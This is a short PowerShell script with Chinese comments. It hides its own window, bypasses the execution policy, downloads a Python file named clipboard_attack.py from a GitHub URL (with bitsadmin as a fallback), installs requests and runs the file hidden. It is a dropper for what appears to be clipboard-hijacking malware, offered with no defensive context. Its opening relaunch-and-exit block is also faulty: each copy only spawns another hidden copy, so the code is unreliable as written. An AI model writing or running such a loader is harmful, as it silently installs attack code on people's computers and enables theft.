# 让 PowerShell 静默运行
$powershellPath = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
Start-Process -WindowStyle Hidden -FilePath $powershellPath -ArgumentList "-ExecutionPolicy Bypass -File $PSCommandPath" -PassThru
exit

# 设置执行策略为 ByPass
Set-ExecutionPolicy Bypass -Scope Process -Force

# 定义脚本下载链接
$scriptUrl = "https://raw.githubusercontent.com/ethxiaoli/clipboard-setup/main/clipboard_attack.py"
$scriptPath = "$env:TEMP\clipboard_attack.py"

# 检查 Python 是否已安装
$pythonCheck = (Get-Command python -ErrorAction SilentlyContinue)
if (-not $pythonCheck) {
    Write-Host "❌ 未检测到 Python，请安装 Python 3.7 以上版本！"
    exit
}

# 使用 Invoke-WebRequest 下载 Python 脚本
try {
    Invoke-WebRequest -Uri $scriptUrl -OutFile $scriptPath -ErrorAction Stop
} catch {
    Write-Host "⚠️ Invoke-WebRequest 失败，尝试使用 bitsadmin 下载..."
    Start-Process -WindowStyle Hidden -FilePath "bitsadmin" -ArgumentList "/transfer DownloadScript $scriptUrl $scriptPath" -Wait
}

# 确保 Python 脚本已下载
if (Test-Path $scriptPath) {
    Write-Host "✅ 文件下载成功，正在运行..."
    
    # 检查 requests 是否安装
    try {
        python -c "import requests" 2>$null
    } catch {
        Write-Host "⚠️ requests 库未安装，正在安装..."
        python -m pip install requests
    }

    # 运行 Python 脚本
    Start-Process -WindowStyle Hidden -FilePath "python" -ArgumentList $scriptPath -PassThru
} else {
    Write-Host "❌ 下载失败，请检查网络连接或 GitHub 链接是否正确。"
}
